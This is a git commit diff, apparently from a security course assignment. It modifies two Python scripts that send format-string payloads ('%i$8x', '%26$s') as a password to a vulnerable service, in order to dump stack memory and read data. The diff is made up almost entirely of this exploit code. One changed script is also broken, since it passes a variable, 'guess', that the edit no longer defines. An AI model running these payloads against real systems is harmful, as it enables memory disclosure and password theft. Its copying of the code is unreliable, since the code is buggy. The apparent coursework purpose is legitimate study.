14abe41907646abcacb8ab937c3dd78fde63d9ef
Suraj Rathi <suraj.rathi00@gmail.com>
2023-03-05 03:55:42 +0530

    try address in the text

--- a3/p1/stack_dump.py
+++ a3/p1/stack_dump.py
@@ -1,6 +1,8 @@
 #! /usr/bin/python3
 from typing import Iterable, Union
 
+import tqdm
+
 from connect import connect
 
 
@@ -15,20 +17,20 @@ def readable_decode(inp: Union[bytes, Iterable[int]]) -> str:
 
 
 def main():
-    words_to_check = 128
-    num_inner = 128
+    words_to_check = 256
+    num_inner = 64
     # Note the value at 26$ and 27$ won't be accessible, but that's ok as that should be the input buffer itself
 
-    for i in range(1, words_to_check + 1):
+    for i in tqdm.trange(1, words_to_check + 1):
         u = set()
         for j in range(num_inner):
             u.add(connect(password=b"%%%i$8x" % i).decode('ASCII'))
         if len(u) == 1:
             v = tuple(u)[0]
             v = v.replace(' ', '0')
-            str_bytes = v[:2], v[2:4], v[4:6], v[6:8]
+            str_bytes = (v[:2], v[2:4], v[4:6], v[6:8])[::-1]
             byte_bytes = [int(s, 16) for s in str_bytes]
-            print(f"{i:4}:  {v}  {readable_decode(byte_bytes)}")
+            tqdm.tqdm.write(f"{i:4}:  {v}  {readable_decode(byte_bytes)}")
 
 
 if __name__ == '__main__':
--- a3/p1/test_substr_addrs.py
+++ a3/p1/test_substr_addrs.py
@@ -3,16 +3,14 @@ import connect
 
 
 def main():
-    len_pass = 4
+    len_pass = 30
     super_str = b"thiswordakedstactest"
     len_super = len(super_str)
     # Note the value at 26$ and 27$ won't be accessible, but that's ok as that should be the input buffer itself
     for i in range(0, len_super - len_pass + 1):
-        guess = super_str[i: i + len_pass]
-        print(guess)
-        out = connect.connect(password=guess + b"%26$s")
-        if len(out):
-            print(guess, len(out), out)
+        addr_s = super_str[i: i + len_pass]
+        out = connect.connect(password=guess, raw=True)
+        print(out)
 
 
 if __name__ == '__main__':
